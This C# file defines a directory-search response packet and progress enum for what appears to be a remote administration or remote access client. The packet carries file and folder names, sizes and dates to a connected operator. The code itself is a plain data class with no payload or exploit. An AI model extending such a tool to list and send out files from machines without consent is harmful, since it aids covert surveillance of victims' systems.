using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    public enum SearchProgress
    {
        Starting,
        Working,
        Finished,
        Error
    }

    [Serializable]
    public class SearchDirectoryResponse : IPacket
    {
        public string[] Files { get; set; }

        public string[] Folders { get; set; }

        public long[] FilesSize { get; set; }

        public DateTime[] LastModificationDates { get; set; }

        public DateTime[] CreationDates { get; set; }

        public SearchProgress Progress { get; set; }

        public SearchDirectoryResponse()
        {
        }

        public SearchDirectoryResponse(string[] files, long[] filesSize, string[] folders, DateTime[] lastModificationDates, DateTime[] creationDates, SearchProgress progress)
        {
            this.Files = files;
            this.FilesSize = filesSize;
            this.Folders = folders;
            this.LastModificationDates = lastModificationDates;
            this.CreationDates = creationDates;
            this.Progress = progress;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
